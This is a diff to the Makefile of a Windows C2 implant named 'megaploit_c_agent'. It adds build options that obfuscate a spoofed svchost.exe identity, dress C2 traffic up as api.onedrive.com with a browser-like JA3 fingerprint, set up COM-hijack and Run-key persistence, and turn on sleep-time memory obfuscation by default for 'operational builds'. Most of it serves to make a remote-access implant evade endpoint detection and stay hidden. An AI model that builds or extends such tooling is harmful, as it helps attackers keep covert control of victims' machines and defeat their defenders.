@@ -110,6 +110,14 @@ C2_PORT  ?= 50005
 # the IP string and port never appear as plaintext in .rdata / .data.
 # Falls back to empty (plaintext) if python is not found.
 _C2_OBF_FLAGS := $(shell python tools/gen_c2_obf.py "$(C2_IP)" $(C2_PORT) 2>/dev/null)
+
+# Spoof identity XOR obfuscation (F-3) — emits -DSPOOF_IMAGE_OBF_BYTES=... etc.
+# so "svchost.exe" never appears as a verbatim wide string in any PE section.
+# SPOOF_IMAGE and SPOOF_CMDLINE can be overridden at build time:
+#   make C2_IP=... SPOOF_IMAGE="C:\Windows\System32\svchost.exe" SPOOF_CMDLINE="..."
+SPOOF_IMAGE   ?= C:\Windows\System32\svchost.exe
+SPOOF_CMDLINE ?= C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule
+_SPOOF_OBF_FLAGS := $(shell python tools/gen_spoof_obf.py --emit-flags "$(SPOOF_IMAGE)" "$(SPOOF_CMDLINE)" 2>/dev/null)
 NAME     ?= megaploit_c_agent
 
 # SECRET_KEY — required 64-char hex string (32 bytes) to embed in the binary.
@@ -175,6 +183,67 @@ ifdef SC_SVC_NAME
   _SC_SVC_FLAGS := -DSC_SVC_NAME_RAW=\"$(SC_SVC_NAME)\"
 else
   _SC_SVC_FLAGS :=
+endif
+
+# C2_SNI — TLS SNI hostname presented in the ClientHello (F-5).
+# Example:
+#   make C2_IP=10.0.0.1 C2_SNI=api.onedrive.com
+ifdef C2_SNI
+  _SNI_FLAGS := -DC2_SNI=\"$(C2_SNI)\"
+else
+  _SNI_FLAGS :=
+endif
+
+# NO_JA3_PROFILE — disable the SCH_CREDENTIALS browser-matching JA3 cipher
+# suite profile and fall back to the classic SCHANNEL_CRED + SCH_USE_STRONG_CRYPTO.
+# Only needed when targeting Windows 7 / Server 2008 R2 runtimes (which do not
+# support SCH_CREDENTIALS_VERSION) and the built-in runtime fallback is not
+# sufficient.
+#
+# Example:
+#   make C2_IP=10.0.0.1 NO_JA3_PROFILE=1
+ifeq ($(NO_JA3_PROFILE),1)
+  _JA3_FLAGS := -DNO_JA3_PROFILE
+else
+  _JA3_FLAGS :=
+endif
+
+# HTTP_WRAP — enable HTTP/1.1 framing wrapper (F-5).
+# Example:
+#   make C2_IP=10.0.0.1 HTTP_WRAP=1
+ifeq ($(HTTP_WRAP),1)
+  _HTTP_WRAP_FLAGS := -DC2_HTTP_WRAP=1
+else
+  _HTTP_WRAP_FLAGS :=
+endif
+
+# COM_CLSID — CLSID used for HKCU COM hijack persistence (F-7).
+# Default defined in config.h.  Override with:
+#   make C2_IP=... COM_CLSID="{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}"
+ifdef COM_CLSID
+  _COM_FLAGS := -DCOM_HIJACK_CLSID=\"$(COM_CLSID)\"
+else
+  _COM_FLAGS :=
+endif
+
+# OPSEC_OFF — enable operations that are intentionally suppressed by default
+# because they generate high-fidelity EDR alerts or leave persistent artefacts.
+#
+# Currently gated verbs:
+#   persist <regkey> <filename>
+#     Without OPSEC_OFF: copies the EXE to %APPDATA% only; no Run-key write.
+#     With    OPSEC_OFF: also writes HKCU\...\Run key (high-signal, EDR alert).
+#
+#   run_psh <cmd>
+#     Without OPSEC_OFF: invokes powershell.exe via -EncodedCommand (opaque CL).
+#     With    OPSEC_OFF: passes -Command "<cmd>" as plaintext (visible in logs).
+#
+# Enable with:
+#   make C2_IP=... OPSEC_OFF=1
+ifeq ($(OPSEC_OFF),1)
+  _OPSEC_FLAGS := -DOPSEC_OFF
+else
+  _OPSEC_FLAGS :=
 endif
 
 # ---------------------------------------------------------------------------
@@ -285,9 +354,11 @@ MSVC_CFLAGS  := /nologo /W3 /O1 /GS- /Gy /GL /DNDEBUG \
                 /Iclient/core /Iclient/evasion /Iclient/inject /Iclient/shell /Iclient/debug /Itls \
                 /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) $(_C2_OBF_FLAGS) \
                 $(_SK_FLAGS) $(_MN_FLAGS) \
-                $(_MIGRATE_FLAGS) $(_SC_SVC_FLAGS) $(_PIN_FLAGS) $(_DBG_CFLAGS)
+                $(_MIGRATE_FLAGS) $(_SC_SVC_FLAGS) $(_PIN_FLAGS) \
+                $(_SPOOF_OBF_FLAGS) $(_SNI_FLAGS) $(_HTTP_WRAP_FLAGS) $(_COM_FLAGS) $(_JA3_FLAGS) \
+                $(_OPSEC_FLAGS) $(_SLEEP_OBF_FLAG) $(_DBG_CFLAGS)
 MSVC_LDFLAGS := /OPT:REF /OPT:ICF /LTCG
-MSVC_LIBS    := Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib Shell32.lib Iphlpapi.lib
+MSVC_LIBS    := Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib Shell32.lib Iphlpapi.lib wbemuuid.lib
 
 # ---------------------------------------------------------------------------
 # windres — MinGW resource compiler
@@ -345,16 +416,29 @@ _INCLUDE_FLAG := $(if $(_CONFIG_HDR),-include megaploit_build_config.h,)
 #   each subdir needs its siblings + tls/ on the search path
 _CLIENT_INCLUDES := -Iclient/core -Iclient/evasion -Iclient/inject -Iclient/shell -Iclient/debug -Itls
 
+# SLEEP_OBF_ENABLE: enabled by default (opt-out with SLEEP_OBF=0).
+# The full ChaCha20 sleep obfuscation hides agent memory from scanners during
+# sleep — this is one of the most impactful evasion features and should be on
+# in all operational builds.  Disable only for test/debug:
+#   make C2_IP=... SLEEP_OBF=0
+ifeq ($(SLEEP_OBF),0)
+  _SLEEP_OBF_FLAG :=
+else
+  _SLEEP_OBF_FLAG := -DSLEEP_OBF_ENABLE
+endif
+
 MINGW_CFLAGS := -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32 \
                 -ffunction-sections -fdata-sections                     \
                 -fno-ident -fno-asynchronous-unwind-tables              \
                 $(_CLIENT_INCLUDES)                                      \
                 -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) $(_C2_OBF_FLAGS) \
                 $(_SK_FLAGS) $(_MN_FLAGS) \
-                $(_MIGRATE_FLAGS) $(_SC_SVC_FLAGS) $(_PIN_FLAGS) $(CFLAGS_EXTRA) \
+                $(_MIGRATE_FLAGS) $(_SC_SVC_FLAGS) $(_PIN_FLAGS) \
+                $(_SPOOF_OBF_FLAGS) $(_SNI_FLAGS) $(_HTTP_WRAP_FLAGS) $(_COM_FLAGS) $(_JA3_FLAGS) \
+                $(_OPSEC_FLAGS) $(_SLEEP_OBF_FLAG) $(CFLAGS_EXTRA) \
                 $(_INCLUDE_FLAG) $(_DBG_CFLAGS)
 MINGW_LDFLAGS := -Wl,--gc-sections -Wl,--strip-all
-MINGW_LIBS    := -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -lshell32 -liphlpapi -mwindows
+MINGW_LIBS    := -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -lshell32 -liphlpapi -lwbemuuid -lm -mwindows
 
 # ---------------------------------------------------------------------------
 # Detect MSVC vs MinGW
